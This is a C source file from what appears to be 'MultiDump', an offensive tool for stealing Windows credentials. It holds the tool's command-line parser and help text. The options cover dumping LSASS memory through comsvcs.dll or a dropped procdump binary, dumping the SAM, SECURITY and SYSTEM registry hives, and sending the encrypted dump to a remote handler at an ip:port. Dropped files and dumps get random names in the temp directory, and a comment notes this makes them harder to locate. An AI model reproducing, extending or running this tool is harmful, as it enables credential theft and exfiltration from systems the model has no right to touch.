#include <Windows.h>
#include <stdio.h>

#include "Common.h"
#include "Debug.h"

ParsedArgs ParseArgs(int argc, char* argv[]) {
	ParsedArgs args = { 0 };
	CHAR currentDir[MAX_PATH];
	CHAR procDumpPath[MAX_PATH];
	CHAR dmpDir[MAX_PATH];
	CHAR tempDir[MAX_PATH];
	CHAR tempDumpPath[MAX_PATH];

	for (int i = 0; i < argc; i++) {
		if ((strcmp(argv[i], "-H") == 0 || strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)) {
#ifdef DEBUG
			printf("\nUsage:\tMultiDump.exe [-p <ProcDumpPath>] [-l <LocalDumpPath> | -r <RemoteHandlerAddr>] [--procdump] [-v]\n\n");
			printf("-p\t\tPath to save procdump.exe, use full path. Default to temp directory\n");
			printf("-l\t\tPath to save encrypted dump file, use full path. Default to current directory\n");
			printf("-r\t\tSet ip:port to connect to a remote handler\n");
			printf("--procdump\tWrites procdump to disk and use it to dump LSASS\n");
			printf("--nodump\tDisable LSASS dumping\n");
			printf("--reg\t\tDump SAM, SECURITY and SYSTEM hives\n");
			printf("--delay\t\tIncrease interval between connections to for slower network speeds\n");
			printf("-v\t\tEnable verbose mode\n");
			printf("\nMultiDump defaults in local mode using comsvcs.dll and saves the encrypted dump in the current directory.\n");
			printf("Examples:\n");
			printf("\tMultiDump.exe -l C:\\Users\\Public\\lsass.dmp -v\n");
			printf("\tMultiDump.exe --procdump -p C:\\Tools\\procdump.exe -r 192.168.1.100:5000\n");
#endif // DEBUG
			exit(0);
		}
		else if ((strcmp(argv[i], "-P") == 0 || strcmp(argv[i], "-p") == 0) && i + 1 < argc) {
			args.procDumpPath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-l") == 0 || strcmp(argv[i], "-L") == 0) && i + 1 < argc) {
			args.localDmpPath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-r") == 0 || strcmp(argv[i], "-R") == 0) && i + 1 < argc) {
			args.remotePath = argv[i + 1];
			i++;
		}
		else if ((strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "-V") == 0)) {
			args.verboseMode = TRUE;
		}
		else if ((strcmp(argv[i], "--procdump") == 0)) {
			args.procDumpMode = TRUE;
		}
		else if ((strcmp(argv[i], "--nodump") == 0)) {
			args.noDump = TRUE;
		}
		else if ((strcmp(argv[i], "--reg") == 0)) {
			args.regDump = TRUE;
		}
		else if ((strcmp(argv[i], "--delay") == 0)) {
			args.connectionDelay = TRUE;
		}
	}

	if (_getcwd(currentDir, MAX_PATH) == NULL) {
#ifdef DEBUG
		printf("[!] Error getting current directory\n");
#endif // DEBUG
		exit(-1);
	}

	if (!GetTempPathA(MAX_PATH, tempDir)) {
#ifdef DEBUG
		printf("[!] GetTempPathA Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		exit(-1);
	}

	// if the dump extension is not .dmp, it will be appened to the end of the filename
	// using relative path also makes it more diffcult to locate it, 
	// so hardcoding this to make sure it works
	char dmpName[7];
	GenerateFileNameA(dmpName, 6);
	snprintf(tempDumpPath, sizeof(tempDumpPath), "%s%s.dmp", tempDir, dmpName);
	args.tempDmpPath = strdup(tempDumpPath);

	if (args.procDumpPath == NULL) {
		char procDumpName[7];
		GenerateFileNameA(procDumpName, 6);
		snprintf(procDumpPath, sizeof(procDumpPath), "%s%s.exe", tempDir, procDumpName);
		args.procDumpPath = strdup(procDumpPath);
	}

	args.localMode = (args.remotePath == NULL);

	// Setting the default in case remote mode fails
	if (args.localDmpPath == NULL) {
		char encDmpName[7];
		GenerateFileNameA(encDmpName, 6);
		snprintf(dmpDir, sizeof(dmpDir), "%s\\%s.dat", currentDir, encDmpName);
		args.localDmpPath = strdup(dmpDir);
	}
	return args;
}